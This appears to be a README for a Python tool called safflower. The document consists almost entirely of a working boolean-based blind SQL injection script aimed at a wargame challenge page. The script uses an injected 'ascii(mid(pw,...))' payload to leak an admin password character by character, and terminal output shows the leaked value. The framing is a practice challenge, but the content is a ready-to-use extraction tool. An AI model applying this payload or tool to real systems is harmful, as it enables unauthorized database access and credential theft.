# safflower.py

## Blind Class

```python3
#!/usr/bin/env python3
import safflower


def example(i, c):
	import requests
	url = 'https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php'
	params = {
		'pw': """foo' || id = 'admin' && ascii(mid(pw, %d, 1)) > '%d""" % (i + 1, ord(c)),
	}
	cookies = {
		'PHPSESSID': '???',
	}
	res = requests.get(url, params=params, cookies=cookies)
	return '<h2>Hello admin</h2>' in res.text


blind = safflower.blind()
res = blind.leak(
	compare_function = example,
	max_length = 10,
	letter_table = blind.MULTI_BYTES,
	use_logging = True,
	use_asynchronous = True,
)

print()
try:
	import hexdump
	hexdump.hexdump(res.encode())
except:
	print(res)
```

```terminal
$ python demo.py
[+] LEAK - 　　　　　8　　　　
[+] LEAK - 　　　　98　　　　
[+] LEAK - 　　　a98　　　　
[+] LEAK - 　　　a985　　　
[+] LEAK - 　9　a985　　　
[+] LEAK - 09　a985　　　
[+] LEAK - 095a985　　　
[+] LEAK - 095a9852　　

00000000: 30 39 35 61 39 38 35 32                           095a9852
```

